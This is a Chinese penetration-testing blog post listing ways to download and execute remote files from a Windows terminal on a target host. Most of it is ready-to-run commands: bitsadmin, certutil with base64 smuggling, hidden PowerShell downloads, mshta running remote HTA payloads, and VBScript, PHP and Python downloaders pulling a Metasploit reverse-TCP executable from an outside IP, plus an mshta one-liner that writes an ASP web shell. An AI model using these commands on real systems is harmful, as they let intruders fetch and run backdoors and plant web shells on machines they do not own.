<!DOCTYPE html>
<html lang="en">
  <head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <meta name="description" content="在 windows 的终端下下载文件，在 windows 的终端下执行远程文件"/>
  <meta name="author" content="Reber"/>
  
    
      <title>Windows 终端下载文件和执行远程文件 | Reber&#39;s Blog</title>
    
  
  <link rel="stylesheet" href="/css/reset.css"/>
  
  <link rel="stylesheet" href="/css/smigle.css"/>
  
    <link rel="stylesheet" href="/css/monokai-sublime.min.css"/>
  
    <link rel="stylesheet" href="/css/style.css"/>
  
  
    <script src="/js/jquery-3.6.0.min.js"/></script>
  
    <script src="/js/highlight.min.js"/></script>
  
    <script src="/js/style.js"/></script>
  
  <link rel="icon" type="image/img" sizes="16x16" href="/img/logo.png">
  <meta name="msapplication-TileColor" content="#da532c">
  <meta name="theme-color" content="#ffffff">
</head>

  <body>
    <header>
  <div id="brand">
    <a class="icon-link" href="https://wyb0.com/">
      <img
        class="icon"
        src="/img/logo.png"
      />
    </a>
    <div class="text">
      <a href="https://wyb0.com/"><h1>Reber&#39;s Blog</h1></a>
      <h3>只会一点点编程、只会一点点渗透</h3>
    </div>
  </div>
  <nav>
    
      
        
        <a href="/"><b>Home</b></a>
      
         | 
        <a href="/posts/"><b>Posts</b></a>
      
         | 
        <a href="/categories/"><b>Categories</b></a>
      
         | 
        <a href="/tags/"><b>Tags</b></a>
      
         | 
        <a href="/about/"><b>About</b></a>
      
         | 
        <a href="/friends/"><b>Friends</b></a>
      
    
  </nav>
  <hr />
</header>

    <div id="content">
      
  <main>
    <article>
      <h1>Windows 终端下载文件和执行远程文件</h1>
      
<div class="post-meta">
    <time>2018-02-06</time>
    
    [<a href="/categories/Pentest">Pentest</a>](<a href="/tags/intranet">intranet</a>)
</div>

      <div><p>环境：Windows Server 2008 R2 Enterprise</p>
<h3 id="0x00-bitsadmin下载文件">0x00 bitsadmin下载文件</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>bitsadmin /rawreturn /transfer getfile http://114.115.123.123/a.exe C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\T</span>emp<span style="color:#ae81ff">\a</span>.exe
</span></span><span style="display:flex;"><span>bitsadmin /rawreturn /transfer getpayload http://114.115.123.123/a.zip C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\T</span>emp<span style="color:#ae81ff">\a</span>.zip
</span></span><span style="display:flex;"><span>bitsadmin /transfer myDownLoadJob /download /priority normal http://114.115.123.123/a.exe C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\T</span>emp<span style="color:#ae81ff">\a</span>.exe
</span></span></code></pre></div><h3 id="0x01-certutil下载文件">0x01 certutil下载文件</h3>
<p>保存在当前目录</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>certutil -urlcache -split -f http://114.115.123.123/a.exe a.exe
</span></span></code></pre></div><p>有时会下载二进制文件的base64编码后的字符串，然后再解码</p>
<pre tabindex="0"><code>本地：certutil -encode cc.exe base64.txt
目标：certutil -urlcache -split -f http://114.115.123.123/base64.txt
目标：certutil -decode base64.txt cc.exe
</code></pre><p>文件会以二进制形式缓存到目录：C:\Users\Administrator\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>certutil -urlcache -f http://114.115.123.123/a.exe
</span></span></code></pre></div><h3 id="0x02-powershell下载文件">0x02 powershell下载文件</h3>
<p>有的时候PowerShell的执行权限会被关闭，需要使用如下的语句打开。</p>
<p>C:&gt;powershell set-executionpolicy unrestricted</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>powershell <span style="color:#f92672">(</span>new-object System.Net.WebClient<span style="color:#f92672">)</span>.DownloadFile<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;http://114.115.123.123/a.exe&#34;</span>,<span style="color:#e6db74">&#34;C:\Windows\Temp\a.exe&#34;</span><span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#-w hidden 下载后终端自动退出</span>
</span></span><span style="display:flex;"><span>powershell -w hidden -c <span style="color:#f92672">(</span>new-object System.Net.WebClient<span style="color:#f92672">)</span>.DownloadFile<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;http://114.115.123.123/a.exe&#34;</span>,<span style="color:#e6db74">&#34;C:\Windows\Temp\a.exe&#34;</span><span style="color:#f92672">)</span>
</span></span></code></pre></div><h3 id="0x03-mshta下载文件与执行远程文件">0x03 mshta下载文件与执行远程文件</h3>
<p>使用mshta命令的文件都会被缓存到：C:\Users\Administrator\AppData\Local\Microsoft\Windows\Temporary Internet Files</p>
<ul>
<li>执行远程hta文件</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mshta http://114.115.123.123/payload.hta
</span></span><span style="display:flex;"><span>mshta http://114.115.123.123/a.exe
</span></span><span style="display:flex;"><span><span style="color:#75715e">#payload.hta和a.exe都会被缓存在IE的缓存目录</span>
</span></span></code></pre></div><p>payload.hta</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE html&gt;</span>
</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span> <span style="color:#a6e22e">lang</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;en&#34;</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">head</span>&gt;
</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">meta</span> <span style="color:#a6e22e">charset</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;UTF-8&#34;</span>&gt;
</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">language</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;VBScript&#34;</span>&gt;
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">Window</span>.<span style="color:#a6e22e">ReSizeTo</span> <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">Window</span>.<span style="color:#a6e22e">moveTo</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">2000</span>,<span style="color:#f92672">-</span><span style="color:#ae81ff">2000</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">Set</span> <span style="color:#a6e22e">objShell</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">CreateObject</span>(<span style="color:#e6db74">&#34;Wscript.Shell&#34;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">objShell</span>.<span style="color:#a6e22e">Run</span> <span style="color:#e6db74">&#34;calc.exe&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">self</span>.<span style="color:#a6e22e">close</span>
</span></span><span style="display:flex;"><span>    &lt;/<span style="color:#f92672">script</span>&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">head</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">body</span>&gt;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>demo
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">body</span>&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">html</span>&gt;
</span></span></code></pre></div><ul>
<li>写文件的方法</li>
</ul>
<pre tabindex="0"><code>mshta vbscript:createobject(&#34;scripting.filesystemobject&#34;).createtextfile(&#34;a.asp&#34;,2,ture).writeline(&#34;&lt;%execute(request(&#39;l&#39;))%&gt;&#34;)(window.close)
</code></pre><h3 id="0x04-visual-basic">0x04 Visual Basic</h3>
<pre tabindex="0"><code>Set args = Wscript.Arguments
Url = &#34;http://114.115.123.123/wyb/msf_reverse_tcp_x86.exe&#34;
dim xHttp: Set xHttp = createobject(&#34;Msxml2.ServerXMLHTTP.3.0&#34;)
dim bStrm: Set bStrm = createobject(&#34;Adodb.Stream&#34;)
xHttp.Open &#34;GET&#34;, Url, False
xHttp.Send
with bStrm
    .type = 1 &#39;
    .open
    .write xHttp.responseBody
    .savetofile &#34;C:\Windows\Temp\aa.exe&#34;, 2 &#39;
end with
</code></pre><p>C:\Users\Administrator\Desktop&gt; cscript test.vbs</p>
<h3 id="0x05-利用脚本语言">0x05 利用脚本语言</h3>
<ul>
<li>PHP</li>
</ul>
<pre tabindex="0"><code>#!/usr/bin/php
&lt;?php
    $data = file_get_contents(&#34;http://114.115.123.123/wyb/msf_reverse_tcp_x86.exe&#34;);
    file_put_contents(&#39;C:\\Windows\\Temp\\aa.exe&#39;,$data);
?&gt;
</code></pre><p>C:\Users\Administrator\Desktop&gt; php aa.php</p>
<ul>
<li>Python</li>
</ul>
<pre tabindex="0"><code>import urllib2;u = urllib2.urlopen(&#39;http://114.115.123.123/wyb/msf_reverse_tcp_x86.exe&#39;);f = open(&#39;C:\\Windows\\Temp\\aa.exe&#39;, &#39;w&#39;);f.write(u.read());f.close();
</code></pre><p>C:\Users\Administrator\Desktop&gt; python aa.py</p>
<h3 id="0x06-ftp">0x06 FTP</h3>
<p>远程连接自己的ftp服务器，然后下载文件</p>
<h4 id="reference侵删">Reference(侵删)：</h4>
<ul>
<li><a href="https://xianzhi.aliyun.com/forum/topic/1654?_blank">https://xianzhi.aliyun.com/forum/topic/1654</a></li>
<li><a href="https://evi1cg.me/archives/Tricks.html?_blank">https://evi1cg.me/archives/Tricks.html</a></li>
<li><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84certutil.exe/?_blank">https://3gstudent.github.io/3gstudent.github.io/渗透测试中的certutil.exe/</a></li>
<li><a href="http://www.secange.com/2017/08/%E6%94%B6%E9%9B%86%E6%95%B4%E7%90%86%E7%9A%8416%E7%A7%8D%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E7%9A%84%E6%96%B9%E5%BC%8F/?_blank">http://www.secange.com/2017/08/收集整理的16种文件下载的方式/</a></li>
</ul>
</div>
    </article>
  </main>

    </div>
    <footer>
  <hr />
  
    <p id="social">
      Find me around the web:
      
        
        <a href="https://github.com/reber0?_blank">GitHub</a>
      
         • 
        <a href="https://weibo.com/u/5819760166?_blank">Weibo</a>
      
    </p>
  
  <p class="copyright">
    Copyright © 2015-2024
    <a href="https://wyb0.com/"><strong>Reber</strong></a>.

    Built with
    <a href="http://www.gohugo.io/">Hugo</a>,
    based on the theme
    <a href="https://gitlab.com/ian-s-mcb/smigle-hugo-theme">smigle</a>.
  </p>
</footer>

  </body>
</html>
